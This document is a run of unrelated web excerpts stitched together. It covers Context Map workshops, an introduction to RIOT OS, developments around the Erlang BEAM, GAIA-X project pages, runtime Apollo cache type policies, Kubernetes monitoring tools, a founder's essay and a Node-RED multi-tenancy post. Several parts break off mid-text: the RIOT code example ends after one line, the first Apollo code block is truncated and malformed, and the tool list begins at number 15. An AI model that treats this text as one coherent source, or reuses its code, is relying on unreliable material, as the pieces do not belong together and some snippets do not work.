<p>I split the group into small groups of 3 to 4 people. Each group needs to create a Context Map for their domain, using the output of the EventStorming. As they generate insights, they challenge the EventStorming, documenting it. We can have several rounds, timeboxed (the wonders of timeboxing). After that, each group do a show and tell about their reasoning and thought process. People can ask questions, challenging their model. As the process goes, we collect these questions and ideas. This is what I call the diverge phase. Each group creates their own version of the Context Map, but because the discussion is in small groups, it can be more effective.</p>

<p>The next phase is to start to converge. I ask one person to volunteer and to get all the bounded contexts from the different groups that are the <em>same</em>. In this case, we can get 50% to 80% of the Context Map done, with the advantage that is the part that people agree with each other. It avoids the fatigue of rehashing discussions. The next step in this phase is to start to decide on the “leftovers”, each needs more time to discuss. From my experience, this step is the most interesting one, because people have their own mental models about the bounded contexts. Focusing the energy to discuss the differences and trade-offs of the boundaries leads to a better outcome, and I can guide people over the discussion on the boundaries of the more complicated and complex problems. This last step can take a few hours, or a few sessions over time, depending on the size of the domain. As a rule of thumbs, I tend to split over multiple sessions, to allow people to think about it. Some of the best ideas happen in the shower!</p>

<p>You may ask if it is useful both physically and remotely. And the answer is yes. Physically you need more modelling space, where groups can discuss but not bias each other. Online you need tools that allow people to be isolated in their own room. In the end, it will produce the same output.</p>

<p>I’m wondering about your experiences. How do you get consensus over a Context Map?</p>

                    <p>All of us have used Operating Systems like Windows, Mac or a Linux distribution. I am sure you have wondered about the efforts that must have gone into implementing a system like this or maybe thought, "Oh I wish I could improve this, but how do I start with even understanding such a complex system". I have good news for you; after reading this blog, you will have a starting point to OS development.</p><h3 id="motivation">Motivation</h3><p>OS development in itself sounds a nice and cool but it seems so difficult at first. I realised how fun it is after working on my thesis to develop a complete network stack for an OS. </p><p>I found OS development has the following advantages with :</p><ol><li>Become proficient in low-level languages like C</li><li>Practical applications of theory for those who have taken courses like OS and faster grasping of concepts for others</li></ol><p>These are just a few from the top of my mind, but a fair warning, you probably won't be able to improve to Windows anyways for apparent reasons. </p><h3 id="prerequisites">Prerequisites</h3><p>The purpose of this blog is to inspire more people to start OS development regardless of their conceptual understanding of complex operating systems. However, it is better if you have preliminary knowledge of the following:</p><ul><li>Compiling and Running C code with features like <a href="https://www.programiz.com/c-programming/c-preprocessor-macros">macros</a> (preprocessing directives to make code smaller and more generic)</li><li><a href="https://www.tutorialspoint.com/makefile/index.htm">Makefile</a> (a build automation tool to compile your code automatically with the set of rules defined in the file)</li><li>GitHub</li></ul><h2 id="theory">Theory</h2><p>Before we go into the details of Operating Systems and their development, let me give a brief introduction to <strong>Process Scheduling</strong>. Readers who know this concept can skip this section.</p><p>Every task sent from one of the programs to the Processing Unit of the Computer has two major components, namely, IO and CPU parts. After doing the CPU part of the task, the CPU would essentially be ideal; therefore, to improve the overall efficiency, a scheduler is present to schedule the tasks as they come. In layman's terms, it decides what process will run on the CPU at a particular point in time. This part of the OS is called a process scheduler. The figure below shows an example of a simple process scheduler.</p><figure><img src="https://blog.bitsacm.in/content/images/2020/09/image-5.png"><figcaption>Process scheduler [3]</figcaption></figure><p>You can read more on this <a href="https://www.tutorialspoint.com/operating_system/os_processes.htm">blog</a>.</p><h2 id="operating-systems">Operating Systems</h2><p>The operating systems, as we know today, are way too complicated as beginners to work on, especially with the limited knowledge we have from our undergrad courses like Operating Systems, Computer Networks and DSA. Therefore here, I will introduce you to Operating Systems designed for low power embedded systems called <a href="https://en.wikipedia.org/wiki/Real-time_operating_system">Real-Time Operating Systems</a> (RTOS). Since the OS runs on hardware with limited resources(low memory and power), it has a reasonably simple construct which in-turn makes understanding the code and contributing to it much more manageable. For example, these operating systems do not need complex process schedulers due to the relative simplicity of the applications running on them. </p><p>In this blog, I will be talking about<a href="https://www.riot-os.org/"> RIOT OS</a>, which is a developing, Open-source RTOS.</p><h2 id="riot-os">RIOT OS</h2><figure><img src="https://blog.bitsacm.in/content/images/2020/09/riot-1.png"></figure><p>The most salient features of this operating system are:</p><ol><li>Can run on hardware with RAM and ROM as low as 1.5kB and 5kB respectively!</li><li>Support to over 100 different embedded device boards which makes it highly versatile and generic</li><li>Minimal hardware-dependent code</li><li>Code on Linux or Mac OS <a href="https://doc.riot-os.org/group__boards__native.html">natively</a>(explained later in the blog), deploy on embedded device</li><li>Highly active community with ~25 commits every day</li><li>Highly experienced people working on development, researchers from renowned Universities in France and Germany, so they know what they are doing</li><li>Conducive and active contributor community, hence providing a nurturing environment for new contributors</li><li>The best, its <strong>Open-Source</strong>, so you can modify the code for free and even contribute to it</li></ol><p>So, now let's delve into the operating system with a small introduction to the OS itself and then I will show you how to run a user application on the OS designed for IoT devices.</p><h3 id="riot-os-structure">RIOT OS Structure</h3><figure><img src="https://lh4.googleusercontent.com/BuhvNw7PM8jAGLsf_EFgVheuFhkmIzEgCdam8ee9u2VoS3uogk1jokvm-SOAxSkszNPbOXQeS534YbxT0H72jC7qz9YDglhyMt41hgI3z00YGIz68K-e9K8DlkFhGjnJ4W2ANu2Y"><figcaption>RIOT Structure [2]</figcaption></figure><p>The Image above gives an overview of RIOT structure which shows that RIOT OS, like any other RTOS, is logically divided into the following categories:</p><ul><li>Core/kernel: Implements the basic data structures and heart of the OS</li><li>Hardware: Implements the abstraction to interact with a micro-controller, hardware devices like radio devices, sensors, etc. The component includes CPU specific implementations, configuration for different boards which use those CPUs, supporting peripheral implementations like real-time clocks and drivers of various sensors.</li><li>System functionalities: Implements system libraries which are not part of the basic kernel like networking and file system</li><li>Packages: Implements support for all additional external libraries which are not a part of OS code</li><li>Applications: Implements high-level logic for use in actual applications.</li></ul><p>Don't worry if you don't exactly get what each component gets just yet. You will understand it as you work your way into the code and reach the registers on the micro-controller.</p><p>The user applications in RTOS are compiled and directly linked with the Operating System's code into one binary. This helps reducing final binary size, which is beneficial since the MCUs have low memory. This feature is in contrast to our traditional operating systems where we can run the application on top of the OS.</p><p>Now, the next question that comes to mind is that as a software developer how could you work on an Operating System that runs on separate hardware(micro-controller) which you may not want to buy (at least initially). RIOT developers have an excellent solution for this which simulates the hardware to run on your PC natively(more on this when we go through the example later in the blog). Also, there is an open-source test-bed on which one can openly deploy their code for testing at <a href="https://www.iot-lab.info/">FIT IoT-Lab</a>.</p><p>Another fantastic thing about the operating system is how the code design and the build system work together to make each module easily swappable. For example, if the user application only needs the shell, they only need to include the module corresponding to shell in the user application Makefile.</p><p>RIOT OS has <em>tickless priority-based</em> scheduler. It is a very primitive scheduler where the scheduler does not schedule processes according to time spent by the process on CPU. Instead, schedules processes according to the processes' priority. For example, the scheduler will schedule the process with lower priority (say, priority 5) only after all the higher priority processes(processes with priority 1-4) have finished executing. Such a primitive scheduler is there to reduce the complexity of the final system again due to limited computing resources (low computing power of the MCU). If you are interested to know more about how priority scheduling works, you can watch the <a href="https://youtu.be/cNdEQKw4apM">video</a>.</p><h3 id="default-example-of-riot">Default Example of RIOT</h3><h4 id="setting-up-your-pc">Setting up your PC</h4><p>So, the first task would be to get your pc ready to compile, flash (on an external hardware board, if any) and run the operating system. For this, you can follow the Tutorials provided on their website <a href="https://github.com/RIOT-OS/Tutorials/blob/master/README.md">[1]</a>. You would be installing essential tools like <code>git</code>, <code>make</code>, <code>gcc</code>, <code>openocd</code> (an open-source tool for debugging and flashing micro-controllers) and a <code>cross-compiler</code> which works with <code>gcc</code> to compile the code for arm based embedded devices.</p><h4 id="example-explained">Example explained</h4><p>After installing all the dependencies and cloning OS code from GitHub, you should go to the <code>./examples/default</code> directory in the riot folder which is a primitive example of application code running on the OS. We will use this default example as a reference in this blog. All the folders inside the examples folder represent example user applications running on the OS. There are two main components here, namely <code>main.c</code> and <code>Makefile</code>. The <code>main.c</code> file contains user application code. The <code>Makefile</code> is a file with some set of directives(rules stating to include some particular modules of the operating system) utilising make build tool(this tool essentially automates the compilation process) to generate the final binary.</p><figure><pre><code>#include "thread.h"

        <small>2020-10-26</small>
        <p>The BEAM is the virtual machine that Erlang and Elixir runs on. It is widely cited as a battle-tested piece of software though I don’t know in which wars it has seen action. It has definitely paid its dues in the telecom space as well as globally scaled projects such as Whatsapp and Discord. It is well suited to tackle soft-realtime distributed systems with heavy concurrency. It has been a good platform chugging along. And with a small team at Ericsson responsible for much of its continuing development it has been managed in a deeply pragmatic way. Erlang has always been a bit of a secret and silent success. Almost no-one uses it if you look at market shares. But among the ones that use it there seems to be a very positive consensus. And then Elixir came and caused a bit of a boom. I think the BEAM has benefited from Elixir and Elixir wouldn’t exist without the BEAM. With that bit of background I’d like to shine a light on some cool developments that I think makes the BEAM more interesting or even uniquely interesting in the future.</p>
<h2 id="the-jit-is-here-soon-otp-24">The JIT is here (soon, OTP 24)</h2>
<p>With OTP 24 landing sometime next year we are going to get the a JIT for the BEAM. Based on the project <a href="https://github.com/asmjit/asmjit">AsmJit</a> this will mean that some BEAM code will be translated to native instructions. It will not be the kind of warm-up-for-performance-gains JIT that I’ve heard of in PyPy but rather significantly simpler. The goal of the project was to introduce a JIT that could give performance gains for some cases but would not cause any performance regressions. A pragmatic and laudable approach. Considering this made the Jason JSON-library (written in Elixir) beat the Jiffy JSON-library (written as a C NIF) in <strong>some</strong> tests I think this has the potential to obviate the need for some NIF implementations. Avoiding reaching out to the lower level code that is more capable but more dangerous is a good win.</p>
<p>Anyone running RabbitMQ should look forward to the update as measurements indicate 30-50% increased message throughput. Which is a nice thing to get for no code changes at all.</p>
<p>Pushing the performance of the BEAM closer to native is magnificent. To be clear the BEAM is already quite a good performer. I would put Erlang and Elixir at the abstraction level of languages like Python/Ruby/Node.js. Python and Ruby are poor performers. The Python ML stuff all goes into C++ or similar for performance. I’ve worked a bunch with Python and the things I hear from the Ruby world makes them sound quite equivalent in performance. They are a bit slow and can only <a href="https://underjord.io/more-than-one-thing-at-a-time.html">do one thing at a time</a>. Node.js is a bit different. It can do multiple things at a time, if you append asterisks and squint. It does it largely the same way Python + Gevent does it. This approach is incredibly susceptible to CPU-bound work causing head-of-line blocking. It becomes the single most important consideration for building a performant application “get to IO, don’t compute”. V8 that Node.js runs on is heavily optimized and fast for such a dynamic language. I think the BEAM provides a better approach that can deliver comparable results without as many footguns (opportunities for shooting yourself in the foot). But getting better at the raw crunching is a big gain with this JIT implementation and I look forward to the release.</p>
<h2 id="lumen---static-compilation--wasm">Lumen - Static compilation &amp; WASM</h2>
<p>The <a href="https://getlumen.org/">Lumen project</a> is a huge effort by a gang of open source developers and DockYard to implement a compiler (and more) that can take Elixir and Erlang into the browser. By solving that they end up solving static compilation for Erlang and Elixir as well. So this isn’t compiling and shipping the BEAM to the browser. This is a faithful reimplementation of the BEAM functionality in a way that allows it to be compiled statically. It uses LLVM and requires quite a bit of effort both in development and in wrangling the Web Assembly work group process stuff to make sure that the standard is not entirely run by Object-Oriented Programming needs.</p>
<p>I don’t think Lumen will replace the BEAM. The BEAM has a brilliant track record for long-running services and distributed computing that the Lumen project do not even attempt to achieve right now. Instead the Lumen project will allow Elixir and Erlang to move into spaces where the BEAM might be a bit too heavy and still provide the same guarantees. Typically I see it being good for command line tools, web frontends (super interesting to consider the Actor model going there), serverless/edge computing and potentially with WASM competing with Docker as a delivery mechanism for code in Kubernetes, using something like <a href="https://github.com/deislabs/krustlet">Krustlet</a> (<a href="https://player.fm/series/software-sessions/webassembly-on-the-server-with-krustlet">good podcast episode on WASM/Krustlet</a>). It’s probably Cloud Native or something. Who knows.</p>
<p>What gives Lumen the potential to be a better fit in these circumstances is that it can optimize for filesize (by cutting out hot code updates) and it is likely able to start much faster. Lumen is written in Rust. Which seems to be the popular choice around Web Assembly from what I’ve seen. Lumen is still an early release project and not fit for production. But it is beeing actively pushed forward.</p>
<h2 id="nerves---an-iot-platform-with-minimal-suck">Nerves - An IoT platform with minimal suck</h2>
<p>The <a href="https://www.nerves-project.org/">Nerves project</a> is fantastic. I’m a hardware hobbyist, not an IoT dev but I’ve worked a fair bit with Nerves and it is so, so good. What Nerves gives you when working with a Raspberry Pi for example is a way to let your code run all of the device. The BEAM is basically your operating system on top of a minimal Linux installation. The Linux you have is based on the solid foundation of Buildroot so it is quite feasible to modify it as you see fit. The big idea is that if you are running a Linux-level SBC already you might as well build on something that gives you the guarantees of the BEAM.</p>
<p>Beyond that the default setup encodes a lot of good embedded practices by default so that you avoid bricking devices with firmware updates, you get easy support for pushing firmware over the network or USB and much, much more.</p>
<p>There are a ton of good libraries for sensors and assorted hardware, as well as the common protocols like GPIO/SPI/I2C/UART. Networking support is well considered and has been reworked since I first started using Nerves a few years back (and it worked well then too). BLE is getting more and more good support recently.</p>
<p>The project also created <a href="https://www.nerves-project.org/nerveshub">NervesHub</a> which is a solution for managing a fleet of devices by securely providing firmware updates, allowing the switching on of a remote console on devices if that’s a need on your product. I think the most recent stuff is a UI revamp and some serious work on binary diffed patches to minimize firmware update sizes for data-constrained deployments.</p>
<p>This is very much a production project and people are shipping hardware with Nerves. It keeps marching forward.</p>
<h2 id="the-beam-can-be-your-entire-application">The BEAM can be your entire application</h2>
<p>Saša Jurić, author of the much-acclaimed Elixir in Action book has produced a library called <a href="https://github.com/sasa1977/site_encrypt">site_encrypt</a>. It allows you to handle LetsEncrypt configuration without a separate webserver or actually using certbot.</p>
<p>Now this library is good and meaningful in its own right but the underlying idea is why I bring it up. The BEAM can be your entire application. This is something I’ve realized over time. Where in Python you would reach for Gunicorn to run you Django app and Nginx to protect Gunicorn from the big bad world.. The BEAM is made for this. Introducing an intermediate layer of Nginx (or another HTTP server) might actually be detrimental in that you now have two things you need to configure correctly and two pools of multi-core processing workers that care about this request/response cycle and can independently screw it up.</p>
<p>The BEAM was always built for this. OTP has a lot weird corners where you find interesting libraries such as <code>wx</code> for WxWidgets (window management) and <code>ssh</code> for both SSH client and server work I believe. Because it is meant to be delivered as a full solution. It can run and manage multiple different types of work inside of it. Gracefully. It doesn’t replace Kubernetes for the large deployment or polyglot environments. But it might very well mean you don’t actually need to go there early. Or you can reduce how much Ops you need in your Dev. If your entire stack is Elixir or Erlang front to back I think you have empowered your developers significantly.</p>
<p>There is already a move towards this where tools are converging that give us a lot of things out of the box that we’d otherwise need to move outside our application for. These are pragmatic 80-90% solutions. The normal solutions are still all there if you need to reach for them. But maybe you don’t. I see these as moves in the same vein:</p>
<ul>
<li>LiveView - We can reduce the amount of frontend we need to build that isn’t BEAM code (Elixir or Erlang), in some cases get rid of it entirely.</li>
<li>Live Dashboard - Application insights right in your application stack instead of pushing them out to another solution.</li>
<li>Phoenix PubSub - Distributed PubSub without requiring coordination via something like Redis.</li>
<li>Phoenix Channels - Distributed PubSub over WebSockets using the above PubSub to coordinate delivery.</li>
<li>Phoenix Presence - Distribute Presence. A CRDT-powered thing for maintaining information about if someone is connected to a channel or not, like chatrooms and online/offline. Using Channels.</li>
</ul>
<p>Lowering complexity by keeping the solutions in a system you understand well is potentially very powerful. At some point many projects will need to pick up external dependencies such as Nginx, Redis or whatever. But I think there is something compelling about building your application inside a system that can do all of it quite well. Elixir and Phoenix already have significant mind-share in the startup world. I wouldn’t be surprised if this ends up being a very popular solution for startups. No frontend-specific code for the MVP, no New Relic or Mixpanel bill we make do with the Live Dashboard. Distribution is Erlang distribution + Swarm/Horde/Libcluster or something …</p></article></div>

Its aim is to develop common requirements for a European data infrastructure. Therefore openness, transparency and the ability to connect to other European countries are central to GAIA-X. Representatives from seven European countries are currently involved in the project. We want to invite other European partners to join the project and to contribute to its development. Many dialogues are already underway and will be further intensified. Furthermore, GAIA-X is in continuous exchange with the European Commission.</p> <p>Europe makes extensive investments in digital technologies and innovative business models. We must ensure that those who drive innovations forward are also those who benefit in economic terms. This will help to secure value creation and employment in Europe.<br> An open digital ecosystem is needed to enable European companies and business models to compete globally. This ecosystem should allow both the digital sovereignty of cloud services users and the scalability of European cloud providers.</p> <p>Within the GAIA-X project, we are developing the foundations for a federated, open data infrastructure based on European values. ‘Project GAIA-X’ connects centralised and decentralised infrastructures in order to turn them into a homogeneous, user-friendly system.

<div> <div> <p> <span>Technical Concept</span> </p> <h2> How does GAIA-X work? </h2> </div>  </div> <div> <div> <div> <p>Federated services provide value if they are based on common standards which ensure transparency and interoperability. GAIA-X addresses this requirement by aligning network and interconnection providers, Cloud Solution Providers (CSP), High Performance Computing (HPC) as well as sector specific clouds and edge systems. Here, mechanisms are developed to find, combine and connect services from participating providers in order to enable a user-friendly infrastructure ecosystem. GAIA-X identifies the minimum technical requirements and services necessary to operate the federated GAIA-X Ecosystem. The development of these services will follow the principles of Security by Design and also include the concept of Privacy by Design in order to ensure highest security requirements and privacy protection.</p> <p>Technical implementation of these Federation Services will focus on the following areas:</p> <ul><li>the implementation of secure federated identity and trust mechanisms (security and privacy by design);</li><li>sovereign data services which ensure the identity of source and receiver of data and which ensure the access and usage rights towards the data;</li><li>easy access to the available providers, nodes and services. Data will be provided through federated catalogues; </li><li>the integration of existing standards to ensure interoperability and portability across infrastructure, applications and data; </li><li>the establishment of a compliance framework and Certification and Accreditation services; and</li><li>the contribution of a modular compilation of open source software and standards to support providers in delivering a secure, federated and interoperable infrastructure.</li></ul> <p>The initial set of federation services will be expanded. The roadmap is aligned with the development of ecosystem participants’ requirements.</p> </div> </div> </div> </div> <div id="id1839168" tabindex="-1"> <div> <div> <p> <span>GAIA-X in practice</span> </p> <h2> Use Cases: GAIA-X from the user perspective </h2> </div> <p>GAIA-X gives users access to a broad and highly useful range of specialised products and services from cloud providers, thus enabling the use of tailored solutions. In this context, GAIA-X offers full transparency through the self-description, provides certified data protection and supplies regulatory criteria for the products and services offered.</p>  </div> <div> <div> <div> <p>Clear conditions for participation in GAIA-X and for collaboration, and common rules for cross-company authentication and access management will strengthen the underlying level of trust, bring down the obstacles to participation and reduce the amount of work involved in bilateral coordination between individual users.</p> <p>A further important added benefit of GAIA-X is the guarantee of data sovereignty: Each user decides for herself where her data is stored, as well as who may process it and for what purpose, based on the user’s own data classification. In that sense GAIA-X enables modular solutions. Users can also access AI applications and data pools via the trustworthy data infrastructure. Based on standardisation rules and the different options for managing and controlling the transfer of data, data can be exchanged between the companies, linked with other data, processed, evaluated, and monetised in value creation networks. The opportunities of data and service sharing can promote innovations, exploit synergies and enable new business models to be developed and scaled up. </p> <p>The aim of Workstream 1 ‘User ecosystems and requirements’ is to achieve the stated added benefits through a broad and sustained mobilisation of the user and demand perspective. This occurs through continual identification, integration, development and implementation of domain-specific use cases, which illustrate the need for and the added benefit of a sovereign European data infrastructure. The work also focuses on defining domain-specific and cross-domain requirements. These form the foundation for the growth of data infrastructures.</p> <p>In the meantime, more than 40 use cases have been submitted in eight domains (‘Industry 4.0/SME’, ‘Health’, ‘Finance’, ‘Public Sector’, ‘Smart Living’, ‘Energy’, ‘Mobility’ and ‘Agriculture’). They come from various companies and organisations from European countries, including Germany, France, the Netherlands, Spain and Switzerland. On the one hand, they illustrate need for and the added benefit of GAIA-X. On the other hand, they each represent a domain and serve as basis to identify and validate domain-specific and cross-domain requirements and to allow these to be incorporated into the development of GAIA-X.</p> <p>All project participants are invited to participate in Workstream 1 ‘User Ecosystems and Requirements’: Both by submitting new use cases and by active and continuous participation in a domain-specific working group. The establishment of further domains is welcome. Of course, use cases can also be developed and implemented outside the GAIA-X working structure.</p> </div> </div> </div> </div> <div id="id1854484" tabindex="-1"> <div> <div> <p> <span>Use Case Gallery</span> </p> <h2> GAIA-X Use Cases </h2> </div>  </div>  </div> <div id="id1838600"> <div id="accoID1838600"> <div>   <div id="collapse1838768"> <div> <div>   <div id="id1838786">  <ul data-slider-items="3|2|1"> <li> <div> <figure> <picture> <source media="(max-width: 480px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=210w"> <source media="(max-width: 767px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=270w"> <source media="(min-width: 768px)" srcset="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=420w"> <img src="https://www.data-infrastructure.eu/GAIAX/Redaktion/EN/Bilder/UseCases/shared-production.jpg?__blob=normal&amp;v=1&amp;size=480w" title="Icon Shared Production: werk- und firmenübergreifende Produktion als Showcase bzw.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="articleBody mainEntityOfPage"><div><div itemprop="text"><p>Apollo InMemoryCache type policies are used to define <a target="_blank" href="https://www.apollographql.com/docs/react/local-state/managing-state-with-field-policies/#defining">field policies for local state</a>, to <a target="_blank" href="https://www.apollographql.com/docs/react/caching/cache-configuration/#customizing-identifier-generation-by-type">customize identifier generation by type</a> or to <a target="_blank" href="https://www.apollographql.com/docs/react/caching/cache-field-behavior/#merging-arrays">define a custom merge function for the cache</a>.</p>
<p>The standard way of doing this is by defining the type policies during initialization of apollo client like this:</p>
<pre><code><span>const</span> apolloClient = <span>new</span> ApolloClient({
    ...
    cache: <span>new</span> InMemoryCache({
        <span>typePolicies</span>: {

                        read(_, { variables }) {
                            <span>return</span> <span>localStorage</span>
                              .getItem(<span>'BOOKMARKS'</span>)
                              .includes(

                        }
                    }

                <span>keyFields</span>: [<span>"isbn"</span>],

</code></pre>
<p>This might not always be possible. You might want to do this at runtime instead. Some of these scenarios:</p>
<ol>
<li>If you are loading different chunks at runtime based on user interaction</li>
<li>You have a microfrontends architecture (like in our case).</li>
</ol>
<p>To do this you can follow these steps:</p>
<h3 id="1-get-an-instance-of-the-cache">1. Get an instance of the cache</h3>
<pre><code><span>const</span> { loading, error, data, client } = useQuery(QUERY);

<span>const</span> cache = client.cache
</code></pre>
<h3 id="2-add-policies-to-the-cache">2. Add policies to the cache</h3>
<p>To specify key fields for custom identifier generation</p>
<pre><code>cache.policies.addTypePolicies({
    
    <span>Book</span>: {
        <span>keyFields</span>: [<span>"isbn"</span>],
    }
})
</code></pre>
<p>Or to define field policy for local storage</p>
<pre><code>cache.policies.addTypePolicies({
    <span>Article</span>: {
        <span>fields</span>: { 
            <span>isBookmarked</span>: { 
                read(_, { variables }) { 
                    <span>return</span> <span>localStorage</span>
                      .getItem(<span>'BOOKMARKS'</span>)
                      .includes(
                        variables.articleId
                      );
                }
            }
        }
    },
})
</code></pre>
<h2 id="caveat">Caveat</h2>
<p>The reason why it is recommended to configure these at build time is because that way apollo can ensure that the data is not accessed before the type policies are defined.
If you want to do this at runtime, you need to make sure that you call <code>addTypePolicies</code> before you call <code>useQuery</code> with the query that uses the type whose policy you are modifying</p>

<h2><a id="1"></a>Introduction</h2>



<p>In the last few years, Kubernetes has laid waste to its fellow competitors in the battlefield of container orchestration. Sadly, Docker Swarm hasn’t been a major contender since 2016 and, like AWS, admitted defeat by pledging K8s support and integration.</p>



<p><span>Since Kubernetes has skyrocketed to popularity as the container solution of choice, here’s a comprehensive list of all the tools that complement K8s to further enhance your development work.</span></p>

<h3><b>15. Prometheus</b></h3>



<p><span>Prometheus monitoring has fast become the go-to tool for Kubernetes monitoring tool. It offers a multi-dimensional data model and a very user-accessible format and protocols. Exposing Prometheus metrics in Kubernetes is a pretty straightforward task. The data scraped is human readable, in a self-explanatory format, and published using a standard HTTP transport.</span></p>

<h3><b>16. Searchlight</b></h3>



<p><span>Searchlight by AppsCode is a Kubernetes operator for Icinga. Searchlight periodically runs various checks on Kubernetes clusters and alerts you via email, SMS or chat if something goes wrong. Searchlight includes a default suite of checks written specifically for Kubernetes. Also, it can enhance Prometheus monitoring with external black-box monitoring and serves as a fallback in case internal systems completely fail.</span></p>

<h3><b>17. cAdvisor</b></h3>



<p><span>CAdvisor is installed by default on all cluster nodes to collect metrics for Kubernetes about running containers and nodes. CAdvisor Kubelet exposes these metrics through Kubelet APIs (with a default of one-minute resolution). The Metrics Server identifies all available nodes and calls Kubelet API to get containers and nodes resources usage before exposing the metrics through Kubernetes aggregation API.</span></p>

Becoming a millionaire was not discussed, nor even imagined. Yet, here we are.</p><p id="acdf">Here are a few things I’ve learned from a decade of trying to make it on the internet.</p><h2 id="a6d0">Bet on yourself, but make sure it’s actually a bet</h2><p id="bcf1">The low point of (one of) my first companies was being so desperate for revenue that we adapted our<em> virtual job fair</em> platform to become a virtual business directory for a small town. For $2000/yr.</p><p id="6385">There is no upside to that. We essentially became a horribly paid consultant for an industry we didn’t care about with a product that didn’t add any value.</p><p id="f2cc">Limping along for years while eating ramen and pitching a VISION isn’t success — you’ll be much worse off than if you had just worked for a startup for a few years to improve your skills and peers.</p><p id="ce0b">To truly bet on yourself while starting a company, everything you do should accelerate any of the following:</p><ul><li id="bc69">Learning new skills: sales, product management, product development, engineering, marketing, design, fundraising</li><li id="12a6">Meeting great people — not in the “I shook Mark Cuban’s hand” sense, but in the “I have 5 equally motivated people in my corner building shit that I can text about the fact that we won’t make payroll next month.”</li><li id="c5c2">Making money on your own time</li><li id="00e0">Travelling or experiencing the world through a different lens (though in 2020 you should just get a remote job)</li></ul><h2 id="e853">Build your tribe</h2><p id="ae33">You don’t need mentors. You don’t need investors. You need 5 friends with similar ambitions trying to figure this shit out with you.</p><p id="537b">You want people that you can call when your world is falling apart. When you want to quit. When you hate your co-founders. When you’re questioning everything. When you’ve made the money, but don’t feel good about it.</p><p id="8018">It is a weird, un-relatable world that we’re playing in. To navigate it, you need people that understand. I’m so lucky I found my people.</p><p id="1451">I don’t have great advice on how to find your people.</p><p id="c46f">Join a co-working space? Get into a startup accelerator? Join a program like <a href="https://www.beondeck.com/" rel="noopener">On Deck</a>? Message people on Twitter?</p><h2 id="ba6f">Just launch something</h2><p id="64cd">I know many people who are much more talented than I. They’ve got better ideas, more technical skills, and are just plain smarter.</p><p id="1d7d">What they don’t have is that forcing function that compels me to launch stuff.</p><p id="7bb3">The shamelessness. The not-give-a-fuckery.</p><p id="2ae5">To not quit when I want to quit. I’m not sure that “chip on the shoulder” is all positive, but it’s probably necessary.</p><p id="aaf9">It’s a learned behaviour. I don’t come by it naturally. I hate failing. I suck at getting feedback. I’m overly sensitive. And yet, here we are.</p><h2 id="e2b4">It takes 3 years for anything to work</h2><p id="cccf">Every successful company I’ve seen has taken at least 3 years to get some hint of product market fit.</p><p id="1a79">Dig deeper into every company that takes off overnight — it’s probably a pivot from something else, the founder’s 8th attempt, or a hail mary. The one thing that truly worked for me was about 3.5 years in.</p><p id="8fb0">That specific thing worked in month 2, but it took 3.5 years of learning to get to that point.</p><h2 id="43a7">Check your ambitions</h2><p id="2606">My original goal when starting out (Thanks Tim Ferriss!) was to <em>“build a business making 10k a month so I could work from anywhere.”</em></p><p id="b9da">I got there, and enjoyed it — lived in multiple countries, didn’t work too much, drank great wine and ate incredible steak. It wasn’t enough.</p><p id="9d82">Financially, it didn’t matter. The cash was enough, but a life of leisure isn’t a great goal for a 30 year old. I stopped growing, learning.</p><p id="0969">Ironically, that guiding goal held me back. What seemed ambitious at the time led to unambitious decisions, like first building a below average web design company. It also led to coasting when cashflow was (very) good.</p><p id="cdd3">I somehow managed to reverse engineered my version of success, but unfortunately financial success is always a moving target — especially once you have something that works.</p><p id="0d0a">What would have been a better focus is building an exceptional product, an amazing team, and continuing to grow as a leader.</p><p id="65c1">If you can solve for those things, the score (and the cash) takes care of itself.</p><p id="6a9b">That said, if your goal is to build a company that makes 10k/mo that allows you to work from anywhere — go for it, goddamnit.</p><h2 id="1a6e">You will want to quit</h2><p id="38f1">Building something from scratch is hard, and having a job will often sound very appealing.</p><p id="9e48"><em>Here’s what you need to do today, and here’s your paycheque!</em></p><p id="a7a7">Starting a company has infinite variables. At the early stages, you’re pushing a boulder up every hill you can find. You’re trying to find that one thing that gathers enough momentum to allow you to survive another day.</p><p id="664a">If you’re lucky, you’ll get to a place where you’re no longer trying to survive — you’re trying not to die. There’s a difference.</p><p id="6c93">Every day you will have an infinite to-do list, none of which is certain.Take your best guess at what the most important thing you can work on is.</p><p id="6202">Do that thing, and try to ignore everything else.</p><p id="ee2b">Don’t forget to manage your psychology along the way. At the end of the day no one cares if you fail, and it’s not that important. Have grounding forces in your life (sports, family, knitting) to help keep you sane. Try not to build your whole identity around your company.</p><p id="950c">(You won’t do any of this, but I’m hopeful this will help you realize you’re not the only one.)</p><h2 id="52cb">You might surprise yourself</h2><p id="6c90">Most people who reach unheard of levels of success are probably not that much smarter than you, and they probably don’t work that much harder.</p><p id="d7fd">Granted, there are ridiculously smart driven people that operate on another level (Elon Musk, The Collisons). They’re likely going to be trillionaires.</p><p id="7870">I’ve met many people who have built $100m+ companies that are very smart and work very hard — but probably not that much harder than a Senior Engineer at Amazon. Success is a result of talent, hard work, and luck.</p><p id="3b30">If you’re smart, want to work hard, and care about building a business one day — the best place to put that energy is into creating something new.</p><p id="7ac5">You can’t get lucky if you’re not in the game.</p></div></div></section></div></div>]]>

	<!-- .entry-header -->

	<div>
		
<p>I was recently approached by a company that wanted to sponsor adding Multi Tenant support to Node-RED. This would be to enable multiple users to run independent flows on a single Node-RED instance.</p>



<p>This is really not a good idea for a number of reasons. But mainly it is because the NodeJS runtime is inherently single threaded and there is no way to get real separation between different users. For example, if one user uses a poorly written node (or function in a function node) it is possible to block the event loop starving out all the other users or in extreme cases an uncaught asynchronous exception will cause the whole application to exit.</p>



<p>The best approach is to run a separate instance of Node-RED per user, which gives you the required separation between users. The usual way to do this is to use a container based system and a HTTP reverse proxy to control access to the instances.</p>



<p>Over the next months worth of posts I’ll outline the components required to build a system like I described and at the end should hopefully have a fully working Proof of Concept that people can use as the base to build their own deployments.</p>



<p>As the future posts are published I will add links here.</p>



<h2>Required components</h2>



<h3>Flow Storage</h3>



<p>Because containers file systems are not persistent we are going to need somewhere to reliably store the flows each user creates.</p>



<p>Node-RED supplies an <a href="https://nodered.org/docs/api/storage/">API</a> that lets you control how/where flows (and a bunch of things that would normally end up on disk)</p>



<figure></figure>



<h3>Authentication</h3>



